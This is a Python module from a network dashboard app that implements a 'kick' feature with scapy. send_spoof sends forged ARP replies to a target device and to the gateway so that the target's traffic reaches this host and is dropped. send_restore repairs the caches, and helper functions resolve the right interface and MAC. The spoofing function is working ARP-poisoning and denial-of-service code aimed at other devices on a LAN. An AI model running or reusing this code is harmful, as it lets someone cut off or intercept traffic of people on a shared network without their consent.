"""Low-level ARP packet construction for the kick feature.

Every function here needs raw-socket privileges (root on Linux/macOS, or
Administrator + Npcap on Windows). Without them the calls raise and the
spoof engine silently restores state, so the dashboard keeps working.

Critically, every send() is pinned to an explicit interface. scapy's default
`conf.iface` on Windows is whichever adapter it picks first, which on a
VMware/VirtualBox host is a virtual adapter with no path to the LAN —
packets sent there vanish, and scapy logs "MAC address to reach destination
not found. Using broadcast." on every frame.
"""
from __future__ import annotations

import logging
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from .net import KickTarget

log = logging.getLogger("netdash.arp")

BROADCAST = "ff:ff:ff:ff:ff:ff"

# Adapter names that can never carry traffic to a real LAN.
VIRTUAL_HINTS = (
    "vmware", "virtualbox", "hyper-v", "vethernet", "tap-", "loopback",
    "bluetooth", "local area connection", "docker", "wsl", "vpn",
    "teredo", "isatap",
)


def _import_scapy():
    """scapy imports for the ARP layer.

    `sendp` (not `send`) is required: these are raw Ether frames, and scapy's
    `send()` rejects iface= for link-layer packets, then falls back to routing
    them via the default interface — which is how frames ended up on the wrong
    adapter entirely.
    """
    from scapy.all import ARP, Ether, conf, sendp  # type: ignore

    return ARP, Ether, conf, sendp


def _reload_scapy_state() -> None:
    """Refresh scapy's cached interface and route tables.

    scapy snapshots both at import time. On a laptop the Wi-Fi adapter can
    reconnect with a new DHCP address and even a new randomized MAC while the
    process keeps running, leaving the cached ``wlan0`` with an empty IP. The
    resolver then falls through to loopback, the ARP sweep runs on ``lo``,
    returns nothing, and the scanner falls back to the OS cache. Devices look
    like they flap because the sweep is no longer reaching the LAN.
    """
    try:
        from scapy.all import conf  # type: ignore
    except Exception:
        return
    try:
        conf.ifaces.reload()
    except Exception as e:  # noqa: BLE001 - best effort, older scapy builds
        log.debug("scapy interface reload failed: %s", e)
    try:
        conf.route.resync()
    except Exception as e:  # noqa: BLE001
        log.debug("scapy route resync failed: %s", e)


def _route_source_matches(local_ip: str) -> bool:
    """Whether scapy's cached default route still uses our LAN address."""
    try:
        from scapy.all import conf  # type: ignore

        _iface, src, _gw = conf.route.route("1.1.1.1")
        return str(src) == str(local_ip)
    except Exception:
        return False


def resolve_iface(local_ip: str | None = None, name_hint: str | None = None):
    """Return the scapy NetworkInterface bound to the LAN.

    Selection order:
      1. exact `name_hint` match (explicit user choice from Settings)
      2. the adapter holding `local_ip`
      3. the first non-virtual adapter with a routable IPv4

    Falls back to scapy's own default if enumeration fails.
    """
    try:
        from scapy.all import conf  # type: ignore
    except Exception as e:
        log.warning("scapy unavailable, cannot resolve interface: %s", e)
        return None

    try:
        ifaces = list(conf.ifaces.values())
    except Exception as e:
        log.warning("could not enumerate interfaces: %s", e)
        return None

    # A matching interface name is not enough after the adapter reconnected:
    # the cached object can carry the old IP/MAC. Reload when no interface
    # currently holds the address the OS says we should use.
    if local_ip and not any(
        str(getattr(i, "ip", "") or "") == str(local_ip) for i in ifaces
    ):
        _reload_scapy_state()
        try:
            ifaces = list(conf.ifaces.values())
        except Exception:
            pass
    elif local_ip and not _route_source_matches(str(local_ip)):
        # Interface data is current but scapy still routes through a stale
        # source address. Rebuild the route table only; no need to re-enumerate.
        try:
            conf.route.resync()
        except Exception:
            pass

    if not ifaces:
        return None

    by_name = {str(getattr(i, "name", "")): i for i in ifaces}

    if name_hint:
        if name_hint in by_name:
            return by_name[name_hint]
        log.warning("configured interface %r not found; falling back", name_hint)

    if local_ip:
        for i in ifaces:
            if getattr(i, "ip", None) == local_ip:
                return i

    for i in ifaces:
        name = str(getattr(i, "name", "")).lower()
        ip = getattr(i, "ip", None)
        if not ip or str(ip).startswith(("127.", "169.254")):
            continue
        if any(v in name for v in VIRTUAL_HINTS):
            continue
        return i
    return conf.iface


def describe_interfaces() -> list[dict]:
    """Interface inventory, for the Settings page and diagnostics."""
    out = []
    # The Settings page is where a stale interface list is most confusing, so
    # always show what the OS has now rather than what scapy cached at import.
    _reload_scapy_state()
    try:
        from scapy.all import conf  # type: ignore

        default_name = getattr(conf.iface, "name", None)
        for i in conf.ifaces.values():
            name = str(getattr(i, "name", ""))
            out.append(
                {
                    "name": name,
                    "guid": str(getattr(i, "guid", "")),
                    "ip": getattr(i, "ip", None),
                    "mac": getattr(i, "mac", None),
                    "description": str(getattr(i, "description", "")),
                    "is_default": name == default_name,
                    "is_virtual": any(v in name.lower() for v in VIRTUAL_HINTS),
                }
            )
    except Exception as e:
        log.warning("interface inventory failed: %s", e)
    return out


def send_spoof(t: "KickTarget") -> None:
    """Poison both sides of the path so the target's traffic is black-holed.

    1. To the target:   "gateway 192.168.1.1 is at <our MAC>"  -> replies come to us.
    2. To the gateway:  "target <ip> is at <our MAC>"          -> target's frames come to us.
    The target now ARPs for the gateway, we answer, it talks to us, and we drop
    everything instead of forwarding it.
    """
    ARP, Ether, _conf, sendp = _import_scapy()
    iface = resolve_iface(t.local_ip, getattr(t, "interface", None))
    our_mac = _local_mac(t.local_ip)

    packets = [
        Ether(dst=t.mac, src=our_mac)
        / ARP(op=2, hwsrc=our_mac, psrc=t.local_ip, hwdst=t.mac, pdst=t.ip),
        Ether(dst=t.gateway_mac, src=our_mac)
        / ARP(op=2, hwsrc=our_mac, psrc=t.local_ip, hwdst=t.gateway_mac, pdst=t.gateway_ip),
    ]
    sendp(packets, verbose=False, inter=0.05, iface=iface)


def send_restore(t: "KickTarget") -> None:
    """Put the real mapping back: tell the target the gateway's true MAC, and
    the gateway the target's true MAC. Also send gratuitous ARP so peers update
    immediately instead of waiting for cache expiry."""
    ARP, Ether, _conf, sendp = _import_scapy()
    iface = resolve_iface(t.local_ip, getattr(t, "interface", None))
    our_mac = _local_mac(t.local_ip)

    packets = [
        # Target learns the gateway's real MAC.
        Ether(dst=t.mac)
        / ARP(op=2, hwsrc=t.gateway_mac, psrc=t.gateway_ip, hwdst=t.mac, pdst=t.ip),
        # Gateway learns the target's real MAC.
        Ether(dst=t.gateway_mac)
        / ARP(op=2, hwsrc=t.mac, psrc=t.ip, hwdst=t.gateway_mac, pdst=t.gateway_ip),
        # Gratuitous announcements to settle both caches.
        Ether(dst=BROADCAST)
        / ARP(op=1, hwsrc=t.gateway_mac, psrc=t.gateway_ip, hwdst=BROADCAST, pdst=t.gateway_ip),
        Ether(dst=BROADCAST)
        / ARP(op=1, hwsrc=t.mac, psrc=t.ip, hwdst=BROADCAST, pdst=t.ip),
    ]
    sendp(packets, verbose=False, inter=0.05, iface=iface)


def _local_mac(local_ip: str | None = None) -> str:
    """This host's MAC on the interface holding `local_ip`.

    Picking the wrong adapter would have the spoof announce a bogus source MAC
    (e.g. a hypervisor bridge), so match on the address we use as psrc.
    """
    if local_ip:
        mac = getattr(resolve_iface(local_ip), "mac", None)
        if mac:
            return str(mac).lower().replace("-", ":")
        mac = _mac_for_ip_windows(local_ip) or _mac_for_ip_unix(local_ip)
        if mac:
            return mac
    return _first_up_mac()


def _mac_for_ip_windows(ip: str) -> str | None:
    import re
    import subprocess

    try:
        res = subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             f"(Get-NetIPAddress -IPAddress '{ip}' -ErrorAction SilentlyContinue).InterfaceAlias"],
            capture_output=True, text=True, timeout=8,
        )
        alias = (res.stdout or "").strip().splitlines()
        if not alias:
            return None
        res2 = subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             f"(Get-NetAdapter -Name '{alias[0].strip()}' -ErrorAction SilentlyContinue).MacAddress"],
            capture_output=True, text=True, timeout=8,
        )
        m = re.search(r"([0-9A-Fa-f]{2}([:-][0-9A-Fa-f]{2}){5})", res2.stdout or "")
        return m.group(1).lower().replace("-", ":") if m else None
    except Exception:
        return None


def _mac_for_ip_unix(ip: str) -> str | None:
    import re
    import subprocess

    try:
        res = subprocess.run(["ip", "-o", "addr"], capture_output=True, text=True, timeout=6)
        current = None
        for line in (res.stdout or "").splitlines():
            m_if = re.search(r"^\d+:\s+([^:@]+)[:@]", line)
            if m_if:
                current = m_if.group(1).strip()
            if f"inet {ip}/" in line and current:
                res2 = subprocess.run(
                    ["ip", "link", "show", current], capture_output=True, text=True, timeout=6
                )
                m = re.search(r"link/\w+\s+([0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5})", res2.stdout or "")
                return m.group(1).lower() if m else None
    except Exception:
        pass
    return None


def _first_up_mac() -> str:
    """Best-effort fallback when the address->MAC mapping is unavailable."""
    import re
    import subprocess
    import sys

    try:
        if sys.platform == "win32":
            res = subprocess.run(
                ["powershell", "-NoProfile", "-Command",
                 "(Get-NetAdapter | Where-Object {$_.Status -eq 'Up'} | Select-Object -First 1).MacAddress"],
                capture_output=True, text=True, timeout=6,
            )
        else:
            res = subprocess.run(["ip", "link"], capture_output=True, text=True, timeout=6)
        blob = (res.stdout or "") + (res.stderr or "")
        m = re.search(r"([0-9A-Fa-f]{2}([:-][0-9A-Fa-f]{2}){5})", blob)
        if m:
            return m.group(1).lower().replace("-", ":")
    except Exception:
        pass
    return "00:00:00:00:00:00"